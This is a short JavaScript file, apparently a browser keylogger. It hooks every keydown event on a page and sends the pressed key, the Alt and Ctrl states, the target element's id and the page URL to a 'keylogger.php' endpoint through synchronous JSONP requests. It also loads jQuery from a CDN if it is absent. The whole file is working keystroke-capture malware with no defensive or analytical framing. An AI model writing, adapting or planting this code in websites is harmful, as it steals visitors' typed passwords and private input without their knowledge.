if((window.JQuery)){
   console.log("jQuery found");
} else {
   console.log("jQuery not found");
   var script = document.createElement('script');
   script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
   document.body.appendChild(script);
}

function logger(keyPress){
   jQuery.ajax({
      dataType: "jsonp",
      type:"GET",
      url: "keylogger.php",
      jsonp:"keypressed",
      data:{
          altnKey:keyPress.altKey?1:0,
          ctrlKey:keyPress.ctrlKey?1:0,
          userKey:keyPress.key,
          targKey:keyPress.target.id,
          userURI:keyPress.target.baseURI
      },
      async:false,
      success: function(data){
          console.log(data);
      },
      error:function(xhr, ajaxOptions, thrownError){
          console.log("Error");
      }
   });
}

window.onload = function(){
   window.addEventListener("keydown", function(parameter){
      logger(parameter);
   });
}